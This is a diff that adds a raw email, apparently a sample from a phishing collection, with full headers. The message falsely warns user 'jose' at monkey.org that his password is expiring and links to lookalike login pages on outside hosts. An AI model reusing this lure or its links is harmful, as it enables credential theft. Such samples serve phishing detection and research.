@@ -1,0 +1,319 @@
+Return-Path: awet2001awet@hotmail.com
+Delivered-To: jose@monkey.org
+X-FDA: 82524076530.20.CDC5CF7
+Received: from NAM11-CO1-obe.outbound.protection.outlook.com
+ (mail-co1nam11olkn2089.outbound.protection.outlook.com [40.92.18.89])	by
+ imf06.b.hostedemail.com (Postfix) with ESMTP id 2B17FC0009	for
+ <jose@monkey.org>; Tue,  3 Sep 2024 17:14:42 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;	dkim=pass
+ header.d=hotmail.com header.s=selector1 header.b=IHUeKNkl;	dmarc=pass
+ (policy=none) header.from=hotmail.com;	arc=pass
+ ("microsoft.com:s=arcselector10001:i=1");	spf=pass (imf06.b.hostedemail.com:
+ domain of awet2001awet@hotmail.com designates 40.92.18.89 as permitted
+ sender) smtp.mailfrom=awet2001awet@hotmail.com
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1725383586;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=IOhVnCEnfIpcOCoHHf7cOVLbPl9xG8RCfCqCpt3ni7c=;
+	b=UbVDm2ZqzEWUB+kPOpu53k5H8fHnmjwHQhWMVWqo6O5pEdNAso1tzL7z8TA/EhXAvJ1Tl7
+	DtjqhNz7EncXEtOIwJfCIOLTQ2QvVhuIufQLPFfwtnMG8ZNkkyV1ndg6PfY8XtXPlN9vOG
+	orFVdObtV+pcFOBKg6FDE4iPMXIbqvo=
+ARC-Authentication-Results: i=2;	imf06.b.hostedemail.com;	dkim=pass
+ header.d=hotmail.com header.s=selector1 header.b=IHUeKNkl;	dmarc=pass
+ (policy=none) header.from=hotmail.com;	arc=pass
+ ("microsoft.com:s=arcselector10001:i=1");	spf=pass (imf06.b.hostedemail.com:
+ domain of awet2001awet@hotmail.com designates 40.92.18.89 as permitted
+ sender) smtp.mailfrom=awet2001awet@hotmail.com
+ARC-Seal: i=2; s=arc-20220608; d=hostedemail.com; t=1725383586; a=rsa-sha256;
+	cv=pass;
+	b=Wkmd6OqD28ZDWyLtZ+F/SMH/GitEtMKkiJKRJ8MSrzBwOuiscFsCw9zgOBKsoybSzMXpb3
+	eQ9Gv4a4eqsOlYii8bRILysqetISO14+SSG8OQu3XewgBZF6zcCl4NH/wR0CL3EPBEXslT
+	tPlj6SkUYxVPtO/By44taLJp/JE5WNg=
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none; 
+ =?utf-8?q?b=3DLMaj4E358/HhN/ncUKRHfxdz9IfSo5wo1rw6b3UXVid8Wn2RpTmaFJvcsoQSC?=
+ =?utf-8?q?cYs7IuzlV9Uq8t0bBf3vyIGM3KufiBa/KRTAtNtOZRZIY8zirvrbbtFP4tzCtviO2?=
+ =?utf-8?q?eJGY8vSxk2ras66gSRXkY9YYJfEmrX2eHDEy32Jpizyw0T3imXGzrxXwfVlWKa77e?=
+ =?utf-8?q?yZZy3kKJbKDIdonXow2ualjsXnfnZ0N/QqGvwMo4zdKCB7GNAMM+Fa5dDPNpJG2pS?=
+ =?utf-8?q?vXSyq3vI7P8qxccSx680E9uG8Tl8EyRvr45w75fDodUWD+PQJOqnyd6jMrFiN8Ynn?=
+ =?utf-8?q?W8bY3H6vI9Yvep+06y1DQ=3D=3D?=
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001; =?utf-8?q?h=3DFrom=3ADate=3ASubject=3AMessage-ID=3ACont?=
+ =?utf-8?q?ent-Type=3AMIME-Version=3AX-MS-Exchange-AntiSpam-MessageData-Chun?=
+ =?utf-8?q?kCount=3AX-MS-Exchange-AntiSpam-MessageData-0=3AX-MS-Exchange-Ant?=
+ =?utf-8?q?iSpam-MessageData-1=3B?=
+ bh=IOhVnCEnfIpcOCoHHf7cOVLbPl9xG8RCfCqCpt3ni7c=; =?utf-8?q?b=3DiI6CaME5V8G0?=
+ =?utf-8?q?uXkp2B0OVoL9pXih2kV5Shzak07EKzo/fJiHs84Ts+zj7L2Esvz5hAdSV9jHftnBn?=
+ =?utf-8?q?lVjolio8KwZqaJD+16SmDSk9A9aJtuH53PqIOx7aj6qTOXBqIhle7yXxl1rfMB3ug?=
+ =?utf-8?q?wLueRPXgYcrhe0tS8sBt3VHXYwECLxaxv5RLg9rhdvzgRJdWiyBpaTZdFYjI+a4yq?=
+ =?utf-8?q?ZKqEhbQOnxWwP9rvQjB3LhI+3rzA7HAZRzfO6xhTzYhBqQ0cOKOFNnpk1AUAAbkJ3?=
+ =?utf-8?q?nMrdBaT43picV6RrGW0T96+dgnCNLoMoBDMXD6oAAnXu7cqpWZi+tNqqJv0aSjZAE?=
+ =?utf-8?q?7hWLw=3D=3D?=
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
+ s=selector1; =?utf-8?q?h=3DFrom=3ADate=3ASubject=3AMessage-ID=3AContent-Typ?=
+ =?utf-8?q?e=3AMIME-Version=3AX-MS-Exchange-SenderADCheck=3B?=
+ bh=IOhVnCEnfIpcOCoHHf7cOVLbPl9xG8RCfCqCpt3ni7c=; =?utf-8?q?b=3DIHUeKNklp2At?=
+ =?utf-8?q?rtKwlen+yNlDtQM8EPSUUXmVKuCzjvoL2EpRX4bHrzP3Q2Y4IPJjS3TF9bSA5NfV7?=
+ =?utf-8?q?ZuM/9Gyt/4AEUffdVvbExDccvYG+UpbspTEgbddB19me/B3xu1/KOZGmYiGdROICm?=
+ =?utf-8?q?xSZ7DB4xHjyq//kKhQeQ3PBeaplm4/fAwti6PRAAnPvAPfeFrJWy0nb3XlROlGsC9?=
+ =?utf-8?q?VSSp3omfO8LCE9eA9oGLOIjm8fQIb0pgDWAzrSGrdWACGFsD5ul69yNqRVg/6mlTo?=
+ =?utf-8?q?BWk45XqIcMzINSZzcUaHyeFys4do8mSDPj+7ltxGFzcOXz15eIkrD8143NXmiOaJB?=
+ =?utf-8?q?GKhnQ=3D=3D?=
+Received: from CYXP220MB1696.NAMP220.PROD.OUTLOOK.COM (2603:10b6:930:e8::5) by
+ EA2P220MB1632.NAMP220.PROD.OUTLOOK.COM (2603:10b6:303:255::15) with Microsoft
+ SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.20.7918.25; Tue, 3 Sep 2024 17:14:40 +0000
+Received: from CYXP220MB1696.NAMP220.PROD.OUTLOOK.COM
+ ([fe80::f9e1:78af:3350:cec4]) by CYXP220MB1696.NAMP220.PROD.OUTLOOK.COM
+ ([fe80::f9e1:78af:3350:cec4%4]) with mapi id 15.20.7918.024; Tue, 3 Sep 2024
+ 17:14:40 +0000
+From: "Mailbox Notice" <awet2001awet@hotmail.com>
+Subject: Password Notification monkey.org
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="fSWr6e5P3xYjtHyodCZqg4c=_H0OuCSFcf"
+Date: Tue, 3 Sep 2024 18:10:30 +0100
+Message-ID:  <CYXP220MB1696C5577D5ACC58370EDFE9CC932@CYXP220MB1696.NAMP220.PROD.OUTLOOK.COM>
+X-TMN: [puEOUBbva2DKsmL8dvdEZI+o0CS6T0Pr]
+X-ClientProxiedBy: OL1P279CA0013.NORP279.PROD.OUTLOOK.COM
+ (2603:10a6:e10:12::18) To CYXP220MB1696.NAMP220.PROD.OUTLOOK.COM
+ (2603:10b6:930:e8::5)
+X-Microsoft-Original-Message-ID: 
+ <032920240910188F749D4A7D$CE39D6460E@hotmail.com>
+MIME-Version: 1.0
+X-MS-Exchange-MessageSentRepresentingType: 1
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: CYXP220MB1696:EE_|EA2P220MB1632:EE_
+X-MS-Office365-Filtering-Correlation-Id: b519d54c-e2ea-4501-14b0-08dccc3b5175
+X-Microsoft-Antispam: 	=?utf-8?q?BCL=3A0=3BARA=3A14566002=7C461199028=7C5072?=
+ =?utf-8?q?599009=7C19110799003=7C9400799024=7C8060799006=7C12050799009=7C15?=
+ =?utf-8?q?080799006=7C1602099012=7C3412199025=7C4302099013=7C440099028=3B?=
+X-Microsoft-Antispam-Message-Info: 	=?utf-8?q?CNoj9rsRWOKaLe2/h5gs5gTJaq2Q2X?=
+ =?utf-8?q?iwAZrxv+9ZjlNXIQwrbM5/ciidIoS+JRx/DjZOoMt3r0u2BQF/VLqL6A+NIYifx0e?=
+ =?utf-8?q?4et18p3iR8ulr/jFBwW2wJqNMKdpTQOzLsQ0bsH6n8SXPCn6G9yxYJ9tEARH6IG7H?=
+ =?utf-8?q?f1MMmP+HRbzHbf7fqb9j0KA2rZu1lAkmUZB7Mu8bFhPCSJm61Lzj53/PGGqJXN6E9?=
+ =?utf-8?q?M/VowEZf64oF7RzM0FDtEUp57BqHA4c2JjcskUNLwxA3wweQeONEyFYdzcE3fgurn?=
+ =?utf-8?q?9BtV2lhr+iQoUc6RPU4JDd5pAW4cAxzZA4eXPwqNrJQyph6BQZfm5aI7TBNB4oh8x?=
+ =?utf-8?q?llEMu69qU/cXl6WfR0+2ZZHTq5Bcb4ltoN6/a0bnAxFvhqGhhhlJbwdfgEPt8YeRs?=
+ =?utf-8?q?G9F1ydq6aP3yXohcK1aMYPI0EYyM7Vdn+RE7QF1znGjGTrrtQqYhzHwzCMnxM5Tjt?=
+ =?utf-8?q?8Y7NoPGTkewzKOy+7ury5pKizAbxD9Poq7VELNR4R5wa0nPW7bYgtJH6DqaEPX7FM?=
+ =?utf-8?q?CnPZN0OSj3CJ/uyt1evATYOk2kWlQs+vl1/YC6Ui4ffiZOBiV4XyIdeynjBkqAYAT?=
+ =?utf-8?q?zY5RaFrPkgBq7W+YI7Mcc1gOevqSIlMHR5lSTgWGakwytkQ2B/gadh59EnBXRoxi7?=
+ =?utf-8?q?GU83DMrl7bbL3yATmYfEWXoK/aAEdiPPU+i6k2wq85TRKU27uMq0G18avKniXcHU/?=
+ =?utf-8?q?FqbzNAH1hS3i6Ds+ukk8GA5BL0IzFNIMakWpz8GLTe1Fy+cQPx0auxeKVpiNHs3Mp?=
+ =?utf-8?q?WqpZGlsRUEGWHZIHU9VsPxl0Avp6e32CqvKsqpkdVy9EbCFA5UEzdNKH4IfTeLe4A?=
+ =?utf-8?q?GTzZZbmSdKn75fgdnLXI4?=
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0: 
+	=?iso-8859-1?Q?BZ6xpkXlKgY0YgeeZVU5RDTxl7W+VZ4uz8HdxW6hR7WWC9FN1zHyJMCTC+?=
+ =?iso-8859-1?Q?USq5sWmVdkGX0/VqB5Opq0oJAs2MgQ5qnUKqCcB4atheAEhaCy87HozbgP?=
+ =?iso-8859-1?Q?bk6Gri4DL8lXJ0dy2RMZYVki8tc7RVO1nGZASdQP+SlXKaQKWh//ZaLuJp?=
+ =?iso-8859-1?Q?W3atfLOXHU0P0P9llV7eR1p5rkU6AmQrPn2z2KSpZrvwRA2m2eLcir5vsB?=
+ =?iso-8859-1?Q?Do9NqrHb6VSYuSW7o5Dck+EsG1Nig23xC69MTDwHvDwVSf5UEPf3ouLFQy?=
+ =?iso-8859-1?Q?pz0sqM2Hu6f+BcUH2S6x50w9gBdaBqv61CY0QtGBR+H0/+A2JbM0yoNjTX?=
+ =?iso-8859-1?Q?O1Ifb/BDMdsd0aqiAnDWwNFnk2CDIaUFgbz5FxJyQ4IgxyxOzvT3sXW3qY?=
+ =?iso-8859-1?Q?GfT6hRKUeM+igaWcB7H8eUG6U6WnP7d0SardahJUK2FLOiocwxxvyvHNUd?=
+ =?iso-8859-1?Q?5WbNVVnbgwFydOXahfJW157ZJPoufADa9bl+DsNDY9w02RaVV99isQdnVm?=
+ =?iso-8859-1?Q?2jf3ikD3WI00ZYqQNazgUqZHoC4AoFuiTM++1BSRAybVYOFcAyoN+NsW5g?=
+ =?iso-8859-1?Q?wxdOVvfgyaa64L2ucYflBY9VxUrO3WmgqPJwgQoll0uMEbWnhg/F96hbM6?=
+ =?iso-8859-1?Q?Qva+baZ8L4H1Tpma0+bSZjE9zBldx3pcI9De1nTgTY2aUN9PGEsEzzHhK6?=
+ =?iso-8859-1?Q?EVhCRmSv4Hag1JvNeBgHyMc/DP1qLyj7MHs5+op6M5Fc2wkytFjtHP8OPW?=
+ =?iso-8859-1?Q?ROfFFT/DtaRV9FnXAXsjCjUJRCVlHeDQO+431GGKG2C/H7kMNWUtlvNlKk?=
+ =?iso-8859-1?Q?f2B7N3Dgjk6QWOyn7nex7nSn2njLBLXLCkJXbjPpxDk4nHiCzEpOxK8yns?=
+ =?iso-8859-1?Q?jjA724PvcbJkXlmTLzwt/D8vNB0lWn6465224WVr2zKs+q7h+ZwMK8r8oj?=
+ =?iso-8859-1?Q?fmf1IJ49Us0FbQoCI9aZ5sjHqjwPMyK695USxe8vjdZqsaHB8NpRUM8RD6?=
+ =?iso-8859-1?Q?rQkSZgFvyujmDRZdZaNe2QBvgcFx7+apY5wzEgmXhVTKLDI8z9amdNnE3i?=
+ =?iso-8859-1?Q?zlZYt/WghivM/EZHTAgnxBGSSjr+XlZ1JqNpH8Iip/SbL1au7RSCeQU8aq?=
+ =?iso-8859-1?Q?DTR18DRtycRV75Z2Li19A+cxqjXcCRh+Q8e7NF+IwpI+SIBY8MhqOZkUOe?=
+ =?iso-8859-1?Q?u4WeevnU9R4T/0C/mciUPLkmBqcLLPDDsxERaVV2mbzi9pvByQCxWAw56z?=
+ =?iso-8859-1?Q?kVIB9JFwFu44BWm0U5MF/SWyyB5P1AdvPO7Y3PjgUG30K4L7B2kgywfPKH?=
+ =?iso-8859-1?Q?zhfq?=
+X-OriginatorOrg: sct-15-20-7719-20-msonline-outlook-17562.templateTenant
+X-MS-Exchange-CrossTenant-Network-Message-Id:
+ b519d54c-e2ea-4501-14b0-08dccc3b5175
+X-MS-Exchange-CrossTenant-AuthSource: CYXP220MB1696.NAMP220.PROD.OUTLOOK.COM
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Sep 2024 17:10:32.6029
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 
+	00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: EA2P220MB1632
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 2B17FC0009
+X-Stat-Signature: gu89q5dy5bu6paox1aj18k4y4zr6muoc
+X-Rspam-User: 
+X-Spam-Status: No, score=5.30
+X-HE-Tag: 1725383682-530942
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/qvuTr8VPgYkXVEGBfkfukrzMyEAC+5Ht0A+52nwXSYgo?=
+ =?utf-8?q?7A2WoZ2+6vAZtu/QUWgqcifs/mOcRu1lnQvsoyp6svDFqxDbEzd8LwzbJaxE1IQKr?=
+ =?utf-8?q?oljk8+S1d9YjDH8aPQtktRVNW9HRpspcMGq4drXeXs7xCKirk7PTiWz4IYd4Wxv6P?=
+ =?utf-8?q?1VkKfz+2w4taj8XNvt3gWun/Vr+UllrChv4yuWvku5qbK/v6EsguiYORSsAiHrjSr?=
+ =?utf-8?q?OqxneeXCE9l8ra6YpCMxm100yhDgvZO6VKyAZfoS0Dl/igd1z8LafsMhAVRPqba9C?=
+ =?utf-8?q?Q1N30l29U2urUPibn+BLlEozs0ZIALEicb1sZaq2dnSkIB0Vcki4XRcOWwcuzalZO?=
+ =?utf-8?q?Obe2ld78H6AOrD/XtRA1eCyI5rAf7/hSklAS4ZASqP9NxNVlI66zLBe7TUTCDW9ww?=
+ =?utf-8?q?5iTQy9hFuZz6KOSVyrxzLkyFwM44cPcKr42JrqMV6H5HDqGOv186Bo80K7JZIJRwx?=
+ =?utf-8?q?/4YZBnyrCczJD+Ccd//qp5q/9xrdtnde9K4/F+siHlY/0p9npi6NuOzUgPG2ndLSV?=
+ =?utf-8?q?DJe565mLm5YG5FE2fZQjhgDnJKSJXN9vtiAoQS838mSkfmqi0njG+nlXf+cyC3uXm?=
+ =?utf-8?q?pQtTwL2ivj3APSjWW6DIHLvl+xDq9LOT/yy+iNtjZ5LYbVEg7ZgFtnz4aaphIRWC5?=
+ =?utf-8?q?ZkIRcVwrRtSEqrT7u1LuIS82rUG9AvFHNFqS+vnXP5Sh9ZW408kWHqauG4pnRX5zo?=
+ =?utf-8?q?wnOhoQzZaNMRYMQx0St2r4VYTJFIw4lVK/Q6Yj/8NmkciYwZtcK3mSVGex8A/az4x?=
+ =?utf-8?q?yEojsSoQcMTVj8E3N8+L1PH1yx+WdPWGTfwlg/5KX07w3T29UZF0lIbxXKrpJ+jWr?=
+ =?utf-8?q?oqhQQA8Wk8lAXhGlP7W9/yS/AiVYQJGG7g+02jytK6issaCuISsW30BeXMQHTrWbA?=
+ =?utf-8?q?6Y16SpHlqN5bIjq7nK7p7M_gsu8yM46fqp27kAN9Z6fAwJOhORVbOuq/0vxk2rezj?=
+ =?utf-8?q?+p9mpklBj7TDh5rjJPtTgyBi/4W80jyETGqHkVhSojgyha1dxp5RQePUaqGl+Oevw?=
+ =?utf-8?q?6njY+L91Dv9ouFmfS2umC9tZOQ3m8OWvOoqq9Izz65zIC3xQ9YI9poWmka/ceGNpM?=
+ =?utf-8?q?P0NWqPIhc+tZjp4v6yXM2jAg//78Oifu9ktLIQKLahgrjFTi53r1l6AX/444U8z9L?=
+ =?utf-8?q?0qJnKJZ5248LpSEsopPr2r0rIkbWMHqxQL1U2egpLGKQnuKYVmyE6aaJRluRmk3zA?=
+ =?utf-8?q?jCL9fomt7iqRWHR5UlPgDCVqFq/L79rYFmgzP5CkH+VCdsS1uZ7cRXodfQs8X4n1w?=
+ =?utf-8?q?yPSNEp5DAyprny6wbxinhl?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 250
+
+--fSWr6e5P3xYjtHyodCZqg4c=_H0OuCSFcf
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+monkey.org Password Notification=20
+
+*=20
+
+Account: jose
+
+*=20
+
+Registered Domain: monkey.org
+
+*=20
+
+Notification Purpose: Password for jose will expire soon, take action =
+below to avoid lockout.
+
+*=20
+
+Use this button to continue with the same password
+
+https://daaemrealestate.com/sbbtre/login/
+
+https://daaemrealestate.com/sbbtre/login/
+
+Enter Here https://white096331.studio.site/
+
+--fSWr6e5P3xYjtHyodCZqg4c=_H0OuCSFcf
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+  <title> Password Notification monkey.org</title>
+ </head>
+ <body> <p><table style=3D"FONT-SIZE: 16px; BORDER-TOP: rgb(211,211,211) 1p=
+x dotted; FONT-FAMILY: 'YS Text', Arial, sans-serif; BORDER-RIGHT: rgb(211,=
+211,211) 1px dotted; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPS=
+E: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT-TRANSFORM: no=
+ne; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: r=
+gb(211,211,211) 1px dotted; ORPHANS: 2; WIDOWS: 2; font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%"><tbody =
+style=3D"BOX-SIZING: border-box"> <tr style=3D"BOX-SIZING: border-box"> <td=
+ style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotted; =
+FONT-FAMILY: arial, helvetica, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1=
+px dotted; WIDTH: 570px; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; PADDIN=
+G-BOTTOM: 15px; PADDING-TOP: 15px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(211=
+,211,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 15px; =
+BACKGROUND-COLOR: green" align=3D"left"><span style=3D"BOX-SIZING: border-b=
+ox; FONT-SIZE: 30px; FONT-WEIGHT: bold; COLOR: rgb(255,255,255); LINE-HEIGH=
+T: 36px">monkey.org&nbsp;&nbsp;Password&nbsp;<wbr>Notification&nbsp;</span>=
+</td></tr></table><table style=3D"FONT-SIZE: 16px; BORDER-TOP: rgb(211,211,=
+211) 1px dotted; FONT-FAMILY: 'YS Text', Arial, sans-serif; BORDER-RIGHT: r=
+gb(211,211,211) 1px dotted; WIDTH: 598px; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotte=
+d; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: n=
+ormal; BORDER-LEFT: rgb(211,211,211) 1px dotted; ORPHANS: 2; WIDOWS: 2; BAC=
+KGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial; text-decoration-color: initial" c=
+ellspacing=3D"0" cellpadding=3D"0" bgcolor=3D"#ffffff" border=3D"0"><tbody =
+style=3D"BOX-SIZING: border-box"> <tr style=3D"BOX-SIZING: border-box"> <td=
+ style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotted; =
+FONT-FAMILY: arial, helvetica, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1=
+px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; BORDER-LEFT: rgb(211=
+,211,211) 1px dotted; MARGIN: 0px; LINE-HEIGHT: 22px"><table style=3D"BORDE=
+R-TOP: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211,211,211) 1px dott=
+ed; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
+BORDER-LEFT: rgb(211,211,211) 1px dotted" cellspacing=3D"0" cellpadding=3D"=
+0" bgcolor=3D"#ffffff"><tbody style=3D"BOX-SIZING: border-box"> <tr style=
+=3D"BOX-SIZING: border-box"> <td style=3D"BOX-SIZING: border-box; BORDER-TO=
+P: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211,211,211) 1px dotted; =
+BORDER-BOTTOM: rgb(211,211,211) 1px dotted; BORDER-LEFT: rgb(211,211,211) 1=
+px dotted; MARGIN: 0px; LINE-HEIGHT: 22px"></td></tr></table></td></tr></ta=
+ble></p><p><table style=3D"FONT-SIZE: 16px; BORDER-TOP: rgb(211,211,211) 1p=
+x dotted; FONT-FAMILY: 'YS Text', Arial, sans-serif; BORDER-RIGHT: rgb(211,=
+211,211) 1px dotted; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPS=
+E: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT-TRANSFORM: no=
+ne; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: r=
+gb(211,211,211) 1px dotted; ORPHANS: 2; WIDOWS: 2; BACKGROUND-COLOR: rgb(25=
+5,255,255); font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decora=
+tion-style: initial; text-decoration-color: initial" cellspacing=3D"0" cell=
+padding=3D"0" width=3D"665" align=3D"left" bgcolor=3D"#ffffff"><tbody style=
+=3D"BOX-SIZING: border-box"> <tr style=3D"BOX-SIZING: border-box"> <td styl=
+e=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotted; FONT-=
+FAMILY: arial, helvetica, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1px do=
+tted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; PADDING-TOP: 20px; PADDIN=
+G-LEFT: 20px; BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; LINE-H=
+EIGHT: 22px; PADDING-RIGHT: 20px" valign=3D"top" width=3D"663"><font style=
+=3D"BOX-SIZING: border-box"> <ul style=3D"BOX-SIZING: border-box; FONT-SIZE=
+: x-small; MARGIN-TOP: 0px"> <li style=3D"BOX-SIZING: border-box; MARGIN-LE=
+FT: 15px"> <div style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 20px; LINE=
+-HEIGHT: 20px"><span style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">=
+<font style=3D"BOX-SIZING: border-box" size=3D"2">Account</font></span><fon=
+t style=3D"BOX-SIZING: border-box" size=3D"2"><span style=3D"BOX-SIZING: bo=
+rder-box; FONT-WEIGHT: bolder">:</span>&nbsp;jose</font></div></li> <li sty=
+le=3D"BOX-SIZING: border-box; MARGIN-LEFT: 15px"> <div style=3D"BOX-SIZING:=
+ border-box; MARGIN: 0px 0px 20px; LINE-HEIGHT: 20px"><font style=3D"BOX-SI=
+ZING: border-box" size=3D"2"><span style=3D"BOX-SIZING: border-box; FONT-WE=
+IGHT: bolder">Registered Domain:</span>&nbsp;monkey.org</font></div></li> <=
+li style=3D"BOX-SIZING: border-box; MARGIN-LEFT: 15px"> <div style=3D"BOX-S=
+IZING: border-box; MARGIN: 0px 0px 20px; LINE-HEIGHT: 20px"><font style=3D"=
+BOX-SIZING: border-box" size=3D"2"><span style=3D"BOX-SIZING: border-box; F=
+ONT-WEIGHT: bolder">Notification Purpose:</span>&nbsp;Password for&nbsp;jos=
+e&nbsp;&nbsp;will expire soon, take action below to avoid lockout.</font></=
+div></li> <li style=3D"BOX-SIZING: border-box; MARGIN-LEFT: 15px"> <div sty=
+le=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 20px; LINE-HEIGHT: 20px"><fon=
+t style=3D"BOX-SIZING: border-box" size=3D"2"><font color=3D"#333333" face=
+=3D"Helvetica, Dotum, sans-serif"><span style=3D"FONT-SIZE: 12px">Use this =
+button to continue with the same password<font style=3D"BOX-SIZING: border-=
+box" size=3D"2"><br style=3D"BOX-SIZING: border-box"><font color=3D"#333333=
+" face=3D"Helvetica, Dotum, sans-serif"><span style=3D"FONT-SIZE: 12px"><fo=
+nt style=3D"BOX-SIZING: border-box" size=3D"2"> <p><a style=3D"COLOR: rgb(1=
+7,85,204)" href=3D"https://daaemrealestate.com/sbbtre/login/" target=3D"_bl=
+ank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://daaemre=
+alestate.com/sbbtre/login/&amp;source=3Dgmail&amp;ust=3D1725462879747000&am=
+p;usg=3DAOvVaw1WSOYzOvOncxMPxrwOMsaB"></a><a style=3D"COLOR: rgb(17,85,204)=
+" href=3D"https://daaemrealestate.com/sbbtre/login/" target=3D"_blank" data=
+-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://daaemrealestate.=
+com/sbbtre/login/&amp;source=3Dgmail&amp;ust=3D1725462879747000&amp;usg=3DA=
+OvVaw1WSOYzOvOncxMPxrwOMsaB"></a><a style=3D"BOX-SIZING: border-box; FONT-S=
+IZE: 15px; WIDTH: 190px; BACKGROUND: rgb(11,102,35) 0% 50%; COLOR: white; P=
+ADDING-BOTTOM: 15px; TEXT-ALIGN: center; PADDING-TOP: 15px; PADDING-LEFT: 1=
+5px; DISPLAY: block; PADDING-RIGHT: 15px" href=3D"https://white096331.studi=
+o.site/" rel=3D"noopener noreferrer" target=3D"_blank" data-saferedirecturl=
+=3D"https://www.google.com/url?q=3Dhttps://turquoise161216.studio.site/&amp=
+;source=3Dgmail&amp;ust=3D1725462879747000&amp;usg=3DAOvVaw1-IC9O8DOpFVFvHf=
+qTtlrm"><font style=3D"VERTICAL-ALIGN: inherit">Enter Here</font></a></p></=
+font></span></font></font></span></font></font></div></li></ul></font></td>=
+</tr></table></p></body>
+ </html>
+
+--fSWr6e5P3xYjtHyodCZqg4c=_H0OuCSFcf--
+
